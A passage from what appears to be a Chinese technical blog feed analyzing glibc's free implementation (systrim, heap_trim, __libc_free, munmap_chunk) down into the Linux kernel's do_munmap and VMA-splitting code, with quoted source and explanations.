<p>如果前面释放的chunk比较大，就需要做一些处理了。首先对fastbin中的chunk进行合并并添加到unsortedbin中。然后，如果是主分配区，并且主分配区的top chunk大于一定的值，就通过<code>systrim</code>缩小top chunk。如果是非主分配区，就获得top chunk对应的非主分配区的<code>heap_info</code>指针，调用<code>heap_trim</code>尝试缩小该heap。后面来看<code>systrim</code>和<code>heap_trim</code>这两个函数。<br>最后，说明chunk还是通过mmap分配的，就调用<code>munmap_chunk</code>释放它。<code>munmap_chunk</code>函数已经在上一章介绍了。</p>
<h2 id="systrim"><a href="#systrim" class="headerlink" title="systrim"></a>systrim</h2><p><code>systrim</code>用于缩小主分配区的top chunk大小，下面来看，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div></pre></td><td class="code"><pre><div class="line">static int systrim(size_t pad, mstate av) &#123;</div><div class="line">    long top_size;</div><div class="line">    long extra;</div><div class="line">    long released;</div><div class="line">    char *current_brk;</div><div class="line">    char *new_brk;</div><div class="line">    size_t pagesize;</div><div class="line">    long top_area;</div><div class="line"></div><div class="line">    pagesize = GLRO(dl_pagesize);</div><div class="line">    top_size = chunksize(av-&gt;top);</div><div class="line"></div><div class="line">    top_area = top_size - MINSIZE - 1;</div><div class="line">    if (top_area &lt;= pad)</div><div class="line">        return 0;</div><div class="line"></div><div class="line">    extra = (top_area - pad) &amp; ~(pagesize - 1);</div><div class="line"></div><div class="line">    if (extra == 0)</div><div class="line">        return 0;</div><div class="line"></div><div class="line">    current_brk = (char *) (MORECORE(0));</div><div class="line">    if (current_brk == (char *) (av-&gt;top) + top_size) &#123;</div><div class="line"></div><div class="line">        MORECORE(-extra);</div><div class="line">        void (*hook)(void) = atomic_forced_read (__after_morecore_hook);</div><div class="line">        if (__builtin_expect(hook != NULL, 0))</div><div class="line">            (*hook)();</div><div class="line">        new_brk = (char *) (MORECORE(0));</div><div class="line"></div><div class="line">        LIBC_PROBE (memory_sbrk_less, 2, new_brk, extra);</div><div class="line"></div><div class="line">        if (new_brk != (char *) MORECORE_FAILURE) &#123;</div><div class="line">            released = (long) (current_brk - new_brk);</div><div class="line"></div><div class="line">            if (released != 0) &#123;</div><div class="line">                av-&gt;system_mem -= released;</div><div class="line">                set_head(av-&gt;top, (top_size - released) | PREV_INUSE);</div><div class="line">                check_malloc_state (av);</div><div class="line">                return 1;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>首先，如果主分配区的top chunk本来就没什么空间，就直接返回，否则就将主分配区中可以缩小的大小保存在<code>extra</code>中。下面检查当前堆的<code>brk</code>指针是否和top chunk的结束地址相等，如果相等就可以通过<code>MORECORE</code>降低堆的大小，<code>MORECORE</code>是brk的系统调用，最后也是通过<code>do_munmap</code>释放虚拟内存的。<code>__after_morecore_hook</code>函数指针为空，不管它。再下来，获得释放后的堆指针保存在<code>new_brk</code>中，计算释放的虚拟内存的大小<code>released</code>，并将该信息更新到主分配区中，然后设置新top chunk的<code>size</code>。</p>
<h2 id="heap-trim"><a href="#heap-trim" class="headerlink" title="heap_trim"></a>heap_trim</h2><p><code>heap_trim</code>用来缩小非主分配区的heap大小，下面来看，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div></pre></td><td class="code"><pre><div class="line">static int</div><div class="line">internal_function heap_trim(heap_info *heap, size_t pad) &#123;</div><div class="line">    mstate ar_ptr = heap-&gt;ar_ptr;</div><div class="line">    unsigned long pagesz = GLRO(dl_pagesize);</div><div class="line">    mchunkptr top_chunk = top(ar_ptr), p, bck, fwd;</div><div class="line">    heap_info *prev_heap;</div><div class="line">    long new_size, top_size, top_area, extra, prev_size, misalign;</div><div class="line"></div><div class="line">    while (top_chunk == chunk_at_offset(heap, sizeof(*heap))) &#123;</div><div class="line">        prev_heap = heap-&gt;prev;</div><div class="line">        prev_size = prev_heap-&gt;size - (MINSIZE - 2 * SIZE_SZ);</div><div class="line">        p = chunk_at_offset(prev_heap, prev_size);</div><div class="line">        misalign = ((long) p) &amp; MALLOC_ALIGN_MASK;</div><div class="line">        p = chunk_at_offset(prev_heap, prev_size - misalign);</div><div class="line">        p = prev_chunk(p);</div><div class="line">        new_size = chunksize(p) + (MINSIZE - 2 * SIZE_SZ) + misalign;</div><div class="line">        if (!prev_inuse(p))</div><div class="line">            new_size += p-&gt;prev_size;</div><div class="line">        if (new_size + (HEAP_MAX_SIZE - prev_heap-&gt;size)</div><div class="line">                &lt; pad + MINSIZE + pagesz)</div><div class="line">            break;</div><div class="line">        ar_ptr-&gt;system_mem -= heap-&gt;size;</div><div class="line">        arena_mem -= heap-&gt;size;</div><div class="line">        delete_heap(heap);</div><div class="line">        heap = prev_heap;</div><div class="line">        if (!prev_inuse(p))&#123;</div><div class="line">            p = prev_chunk(p);</div><div class="line">            unlink(ar_ptr, p, bck, fwd);</div><div class="line">        &#125;</div><div class="line">        top (ar_ptr) = top_chunk = p;</div><div class="line">        set_head(top_chunk, new_size | PREV_INUSE);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    top_size = chunksize(top_chunk);</div><div class="line">    top_area = top_size - MINSIZE - 1;</div><div class="line">    if (top_area &lt; 0 || (size_t) top_area &lt;= pad)</div><div class="line">        return 0;</div><div class="line"></div><div class="line">    extra = ALIGN_DOWN(top_area - pad, pagesz);</div><div class="line">    if ((unsigned long) extra &lt; mp_.trim_threshold)</div><div class="line">        return 0;</div><div class="line"></div><div class="line">    if (shrink_heap(heap, extra) != 0)</div><div class="line">        return 0;</div><div class="line"></div><div class="line">    ar_ptr-&gt;system_mem -= extra;</div><div class="line">    arena_mem -= extra;</div><div class="line"></div><div class="line">    set_head(top_chunk, (top_size - extra) | PREV_INUSE);</div><div class="line">    return 1;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>第一个while表示，如果top chunk指针正好在<code>heap_info</code>上，则考虑删掉整个heap。这是因为此时，该heap只有一个top chunk。再删掉该heap之前，需要检查该heap的前一个heap是否有足够的空间，否则删掉该heap后，剩余的空间太小。<br>经过计算后，<code>newsize</code>保存了前一个heap高地址处的fencepost和前一个空闲chunk（如果存在）的总大小组成，如果<code>newsize</code>加上该heap还未使用的内存（<code>HEAP_MAX_SIZE - prev_heap-&gt;size</code>）太小，就<code>break</code>退出循环，取消对整个heap的释放。否则，在更新了相应的信息后，调用<code>delete_heap</code>删除整个heap，<code>delete_heap</code>是一个宏，定义如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">#define delete_heap(heap) \</div><div class="line">  do &#123;                                        \</div><div class="line">      if ((char *) (heap) + HEAP_MAX_SIZE == aligned_heap_area)           \</div><div class="line">        aligned_heap_area = NULL;                         \</div><div class="line">      __munmap ((char *) (heap), HEAP_MAX_SIZE);                  \</div><div class="line">    &#125; while (0)</div></pre></td></tr></table></figure>
<p><code>delete_heap</code>其最终通过<code>__munmap</code>释放整个heap，大小为<code>HEAP_MAX_SIZE</code>。<br>删除掉整个heap后，如果前一个heap的fencepost的前面有一个空闲chunk，就将该空闲chunk从空闲链表中脱离，然后设置fencepost或者该空闲chunk（如果存在）的地址为新的top chunk，该top chunk的大小为前面计算的<code>new_size</code>。<br>然后返回<code>while</code>继续检查，如果新的top chunk指针又正好在<code>heap_info</code>上，就表示该heap也就只有一个chunk即top chunk，就继续释放该heap。<br>再往下，如果新的top chunk剩余空间<code>top_area</code>太小，就直接返回了。如果还有足够的空间，且<code>top_area</code>大于收缩阀值，就调用<code>shrink_heap</code>进一步将新的top chunk的大小减少<code>extra</code>。最后设置一些分配区的信息，并设置减少后的top chunk的大小为<code>top_size - extra</code>。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">static int shrink_heap(heap_info *h, long diff) &#123;</div><div class="line">    long new_size;</div><div class="line"></div><div class="line">    new_size = (long) h-&gt;size - diff;</div><div class="line">    if (new_size &lt; (long) sizeof(*h))</div><div class="line">        return -1;</div><div class="line"></div><div class="line">    h-&gt;size = new_size;</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里其实就是减小<code>heap_info</code>的<code>size</code>变量。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>下面对整个<code>_int_free</code>函数做个总结。<br>首先检查将要释放的chunk是否属于fastbin，如果属于就将其添加到fastbin中。<br>然后检查该chunk是否是由mmap分配的，如果不是，就根据其下一个chunk的类型添加到unsortedbin或者合并到top chunk中。<br>接着，如果释放的chunk的大小大于一定的阀值，就需要通过<code>systrim</code>缩小主分配区的大小，或者通过<code>heap_trim</code>缩小非主分配区的大小。<br>最后如果该chunk是由mmap的分配的，通过<code>munmap_chunk</code>释放。</p>
]]></content>
      
        <categories>
            
            <category> pwn </category>
            
        </categories>
        
        
        <tags>
            
            <tag> heap </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[free源码分析——1]]></title>
      <url>/2018/05/21/free%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E2%80%94%E2%80%941/</url>
      <content type="html"><![CDATA[<h1 id="free源码分析—-libc-free"><a href="#free源码分析—-libc-free" class="headerlink" title="free源码分析—__libc_free"></a>free源码分析—__libc_free</h1><p>本章继续之前的glibc中的《malloc源码分析》系列开始分析free的源代码，malloc的源码分析可以查看博客里同类别文章下的《malloc源码分析—1》到《malloc源码分析—5》，因此free的源码中有一些结构和malloc相似的地方就不会做过多的介绍了。</p>
<p>首先在glibc的malloc.c中有如下定义，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">strong_alias( __libc_free, __cfree)</div><div class="line">weak_alias( __libc_free, cfree)</div><div class="line">strong_alias( __libc_free, __free)</div><div class="line">strong_alias( __libc_free, free)</div></pre></td></tr></table></figure>
<p>因此，<code>free</code>是<code>__libc_free</code>的别名，实际执行的是<code>__libc_free</code>函数，下面来看，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">void __libc_free(void *mem) &#123;</div><div class="line">    mstate ar_ptr;</div><div class="line">    mchunkptr p;</div><div class="line"></div><div class="line">    void (*hook)(void *, const void *) = atomic_forced_read (__free_hook);</div><div class="line">    if (__builtin_expect(hook != NULL, 0)) &#123;</div><div class="line">        (*hook)(mem, RETURN_ADDRESS(0));</div><div class="line">        return;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    if (mem == 0)</div><div class="line">        return;</div><div class="line"></div><div class="line">    p = mem2chunk(mem);</div><div class="line"></div><div class="line">    if (chunk_is_mmapped(p))&#123;</div><div class="line">        if (!mp_.no_dyn_threshold</div><div class="line">                &amp;&amp; p-&gt;size</div><div class="line">                        &gt; mp_.mmap_threshold&amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX) &#123;</div><div class="line">            mp_.mmap_threshold = chunksize(p);</div><div class="line">            mp_.trim_threshold = 2 * mp_.mmap_threshold;</div><div class="line">            LIBC_PROBE (memory_mallopt_free_dyn_thresholds, 2,</div><div class="line">                    mp_.mmap_threshold, mp_.trim_threshold);</div><div class="line">        &#125;</div><div class="line">        munmap_chunk(p);</div><div class="line">        return;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    ar_ptr = arena_for_chunk(p);</div><div class="line">    _int_free(ar_ptr, p, 0);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><code>__libc_free</code>首先查看是否有<code>__free_hook</code>函数，如果有就直接调用，这里假设没有默认函数可用。接下来通过<code>mem2chunk</code>将虚拟内存的指针<code>mem</code>转换为对应的chunk指针<code>p</code>，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">#define mem2chunk(mem) ((mchunkptr)((char*)(mem) - 2*SIZE_SZ))</div></pre></td></tr></table></figure>
<p>因为一个使用中的chunk结构体只使用其<code>prev_size</code>和<code>size</code>字段，因此这里只需要减去<code>2*SIZE_SZ</code>。<br>接下来，<code>chunk_is_mmapped</code>用来检查size最低三位中的标志位，判断该chunk是否是由mmap分配的，如果是，就调用<code>munmap_chunk</code>释放该chunk并返回，在调用<code>munmap_chunk</code>之前，需要更新全局的mmap阀值和收缩阀值。<br>再往下，如果该chunk不是由mmap分配的，就通过<code>arena_for_chunk</code>获得分配区指针<code>ar_ptr</code>，并调用<code>_int_free</code>释放内存。<code>_int_free</code>放在下一章分析，本章重点分析<code>munmap_chunk</code>函数。</p>
<h2 id="munmap-chunk"><a href="#munmap-chunk" class="headerlink" title="munmap_chunk"></a>munmap_chunk</h2><p>munmap_chunk用来释放由mmap分配的chunk，下面来看，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">static void internal_function munmap_chunk(mchunkptr p) &#123;</div><div class="line">    INTERNAL_SIZE_T size = chunksize(p);</div><div class="line"></div><div class="line">    assert(chunk_is_mmapped (p));</div><div class="line"></div><div class="line">    uintptr_t block = (uintptr_t) p - p-&gt;prev_size;</div><div class="line">    size_t total_size = p-&gt;prev_size + size;</div><div class="line"></div><div class="line">    if (__builtin_expect(((block | total_size) &amp; (GLRO(dl_pagesize) - 1)) != 0,</div><div class="line">            0)) &#123;</div><div class="line">        malloc_printerr(check_action, &quot;munmap_chunk(): invalid pointer&quot;,</div><div class="line">                chunk2mem(p), NULL);</div><div class="line">        return;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    atomic_decrement(&amp;mp_.n_mmaps);</div><div class="line">    atomic_add(&amp;mp_.mmapped_mem, -total_size);</div><div class="line"></div><div class="line">    __munmap((char *) block, total_size);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>首先获得前一个chunk的指针<code>block</code>，计算这两个chunk的<code>size</code>之和至<code>total_size</code>，接着对全局结构<code>mp_</code>进行相应的设置后，就通过<code>__munmap</code>释放这两个chunk。根据malloc的源码可知，由mmap分配的chunk是独立的，大部分情况下，<code>p-&gt;prev_size</code>为0，因此这里还是释放一个chunk，特殊情况下需要释放两个chunk，特殊情况请参考<code>_int_malloc</code>中的代码。<br><code>__munmap</code>再往下就是系统调用了，定义在linux内核代码的mmap.c中，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">SYSCALL_DEFINE2(munmap, unsigned long, addr, size_t, len)&#123;</div><div class="line"></div><div class="line">    profile_munmap(addr);</div><div class="line">    return vm_munmap(addr, len);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><code>profile_munmap</code>为空函数，下面看vm_munmap，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">int vm_munmap(unsigned long start, size_t len)&#123;</div><div class="line"></div><div class="line">    int ret;</div><div class="line">    struct mm_struct *mm = current-&gt;mm;</div><div class="line"></div><div class="line">    down_write(&amp;mm-&gt;mmap_sem);</div><div class="line">    ret = do_munmap(mm, start, len);</div><div class="line">    up_write(&amp;mm-&gt;mmap_sem);</div><div class="line">    return ret;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里就是信号量的操作，最主要是执行<code>do_munmap</code>释放内存，为了方便分析和查看，只复制了<code>do_munmap</code>的关键代码，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line">int do_munmap(struct mm_struct *mm, unsigned long start, size_t len)&#123;</div><div class="line"></div><div class="line">    unsigned long end;</div><div class="line">    struct vm_area_struct *vma, *prev, *last;</div><div class="line"></div><div class="line">    if ((start &amp; ~PAGE_MASK) || start &gt; TASK_SIZE || len &gt; TASK_SIZE-start)</div><div class="line">        return -EINVAL;</div><div class="line">    len = PAGE_ALIGN(len);</div><div class="line"></div><div class="line">    vma = find_vma(mm, start);</div><div class="line">    prev = vma-&gt;vm_prev;</div><div class="line">    end = start + len;</div><div class="line">    if (vma-&gt;vm_start &gt;= end)</div><div class="line">        return 0;</div><div class="line"></div><div class="line">    if (start &gt; vma-&gt;vm_start) &#123;</div><div class="line">        int error;</div><div class="line"></div><div class="line">        if (end &lt; vma-&gt;vm_end &amp;&amp; mm-&gt;map_count &gt;= sysctl_max_map_count)</div><div class="line">            return -ENOMEM;</div><div class="line"></div><div class="line">        error = __split_vma(mm, vma, start, 0);</div><div class="line">        if (error)</div><div class="line">            return error;</div><div class="line">        prev = vma;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    last = find_vma(mm, end);</div><div class="line">    if (last &amp;&amp; end &gt; last-&gt;vm_start) &#123;</div><div class="line">        int error = __split_vma(mm, last, end, 1);</div><div class="line">        if (error)</div><div class="line">            return error;</div><div class="line">    &#125;</div><div class="line">    vma = prev ? prev-&gt;vm_next : mm-&gt;mmap;</div><div class="line"></div><div class="line">    detach_vmas_to_be_unmapped(mm, vma, prev, end);</div><div class="line">    unmap_region(mm, vma, prev, start, end);</div><div class="line">    arch_unmap(mm, vma, start, end);</div><div class="line">    remove_vma_list(mm, vma);</div><div class="line"></div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>首先对传入的参数进行检查，需要释放的虚拟内存的开始地址<code>start</code>和长度<code>len</code>必须按页对齐，且不能释放内核空间的内存。<br>接着通过<code>find_vma</code>在进程的管理内存的AVL树上查找第一个结束地址大于<code>start</code>的虚拟内存<code>vma</code>，如果<code>vma-&gt;vm_start &gt;= end</code>，说明需要释放的虚拟内存本来就不存在，因此什么也不做返回；如果<code>start &gt; vma-&gt;vm_start</code>，则表示找到的<code>vma</code>包含了需要释放的内存，这时候通过<code>__split_vma</code>函数将该<code>vma</code>根据<code>start</code>地址划分成两块，因此需要判断虚拟内存的数量是否超过了系统的限制<code>sysctl_max_map_count</code>。为了方便分析，下面只给出了<code>__split_vma</code>的几行关键代码，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">static int __split_vma(struct mm_struct *mm, struct vm_area_struct *vma,</div><div class="line">          unsigned long addr, int new_below)&#123;</div><div class="line"></div><div class="line">    struct vm_area_struct *new;</div><div class="line">    new = kmem_cache_alloc(vm_area_cachep, GFP_KERNEL);</div><div class="line">    *new = *vma;</div><div class="line"></div><div class="line">    if (new_below)</div><div class="line">        new-&gt;vm_end = addr;</div><div class="line">    else &#123;</div><div class="line">        new-&gt;vm_start = addr;</div><div class="line">        new-&gt;vm_pgoff += ((addr - vma-&gt;vm_start) &gt;&gt; PAGE_SHIFT);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    if (new_below)</div><div class="line">        err = vma_adjust(vma, addr, vma-&gt;vm_end, vma-&gt;vm_pgoff +</div><div class="line">            ((addr - new-&gt;vm_start) &gt;&gt; PAGE_SHIFT), new);</div><div class="line">    else</div><div class="line">        err = vma_adjust(vma, vma-&gt;vm_start, addr, vma-&gt;vm_pgoff, new);</div><div class="line"></div><div class="line">    if (!err)</div><div class="line">        return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>首先分配一个<code>vm_area_struct</code>结构体<code>new</code>，然后将<code>vma</code>中的所有内容拷贝到<code>new</code>中，<code>new_below</code>决定将原<code>vma</code>按照<code>addr</code>决定的地址分割成两个后，<code>vma</code>中保存低地址部分还是高地址部分。<code>do_munmap</code>第一次进入<code>__split_vma</code>时<code>new_below</code>为0，因此返回的<code>vma</code>保存低地址部分。然后调用<code>vma_adjust</code>对低地址部分的<code>vma</code>进行相应的设置，主要是更改其<code>end</code>变量为<code>addr</code>，并将高地址部分插入进程内存的管理树中。</p>
<p>回到<code>do_munmap</code>中，<code>find_vma(mm, end)</code>获得最尾部的<code>last</code>，如果该<code>last</code>包含了需要释放的虚拟内存，就继续将其拆成两部分，这时候由于<code>new_below</code>为1，因此返回的<code>last</code>为高地址部分。返回后，<code>vma</code>将指向低地址部分。</p>
<p>结合前面的分析，在执行<code>detach_vmas_to_be_unmapped</code>之前，原来的vma被拆成如下所示<br>| prev | vma | … | vma | last |<br><code>mm-&gt;mmap</code>的赋值是在<code>vma_adjust</code>中，其实就是拆分后低地址处那块虚拟内存。<br>接下来<code>detach_vmas_to_be_unmapped</code>用于将所有和要释放的内存有交集的<code>vma</code>从红黑树中删除，并形成一个以<code>vma</code>为链表头的链表。根据刚刚<code>vma</code>被拆开成的结果，其实就是取数组中所有除了<code>prev</code>和<code>last</code>的元素构成一个链表。即<br>| prev | vma | … | vma | last |<br>经过<code>detach_vmas_to_be_unmapped</code>后变成，<br>| prev| last |<br>| vma | … | vma |<br>往下就是要释放第二部分。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">static void detach_vmas_to_be_unmapped(struct mm_struct *mm, struct vm_area_struct *vma,</div><div class="line">    struct vm_area_struct *prev, unsigned long end)&#123;</div><div class="line"></div><div class="line">    struct vm_area_struct **insertion_point;</div><div class="line">    struct vm_area_struct *tail_vma = NULL;</div><div class="line"></div><div class="line">    insertion_point = (prev ? &amp;prev-&gt;vm_next : &amp;mm-&gt;mmap);</div><div class="line">    vma-&gt;vm_prev = NULL;</div><div class="line">    do &#123;</div><div class="line">        vma_rb_erase(vma, &amp;mm-&gt;mm_rb);</div><div class="line">        mm-&gt;map_count--;</div><div class="line">        tail_vma = vma;</div><div class="line">        vma = vma-&gt;vm_next;</div><div class="line">    &#125; while (vma &amp;&amp; vma-&gt;vm_start &lt; end);</div><div class="line">    *insertion_point = vma;</div><div class="line">    if (vma) &#123;</div><div class="line">        vma-&gt;vm_prev = prev;</div><div class="line">        vma_gap_update(vma);</div><div class="line">    &#125; else</div><div class="line">        mm-&gt;highest_vm_end = prev ? prev-&gt;vm_end : 0;</div><div class="line">    tail_vma-&gt;vm_next = NULL;</div><div class="line"></div><div class="line">    vmacache_invalidate(mm);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>回到<code>do_munmap</code>中，<code>unmap_region</code>就是用于释放内存了。下面来看，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">static void unmap_region(struct mm_struct *mm,</div><div class="line">        struct vm_area_struct *vma, struct vm_area_struct *prev,</div><div class="line">        unsigned long start, unsigned long end)&#123;</div><div class="line"></div><div class="line">    struct vm_area_struct *next = prev ? prev-&gt;vm_next : mm-&gt;mmap;</div><div class="line">    struct mmu_gather tlb;</div><div class="line"></div><div class="line">    lru_add_drain();</div><div class="line">    tlb_gather_mmu(&amp;tlb, mm, start, end);</div><div class="line">    update_hiwater_rss(mm);</div><div class="line">    unmap_vmas(&amp;tlb, vma, start, end);</div><div class="line">    free_pgtables(&amp;tlb, vma, prev ? prev-&gt;vm_end : FIRST_USER_ADDRESS,</div><div class="line">                 next ? next-&gt;vm_start : USER_PGTABLES_CEILING);</div><div class="line">    tlb_finish_mmu(&amp;tlb, start, end);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><code>lru_add_drain</code>用于将<code>percpu</code>变量<code>pagevec</code>对应的每个<code>page</code>放回其对应的<code>zone</code>的<code>lru</code>链表中，因为马上要解映射了，这些缓存的page变量由可能被改变。<br><code>tlb_gather_mmu</code>构造了一个<code>mmu_gather</code>变量并初始化。<br>接下来的<code>unmap_vmas</code>用于解映射，即释放存在物理页面映射的虚拟内存，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">void unmap_vmas(struct mmu_gather *tlb, struct vm_area_struct *vma, unsigned long start_addr, unsigned long end_addr)&#123;</div><div class="line"></div><div class="line">    struct mm_struct *mm = vma-&gt;vm_mm;</div><div class="line"></div><div class="line">    mmu_notifier_invalidate_range_start(mm, start_addr, end_addr);</div><div class="line">    for ( ; vma &amp;&amp; vma-&gt;vm_start &lt; end_addr; vma = vma-&gt;vm_next)</div><div class="line">        unmap_single_vma(tlb, vma, start_addr, end_addr, NULL);</div><div class="line">    mmu_notifier_invalidate_range_end(mm, start_addr, end_addr);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里开始遍历<code>vma</code>链表，对每个<code>vma</code>调用<code>unmap_single_vma</code>进行释放，</p>
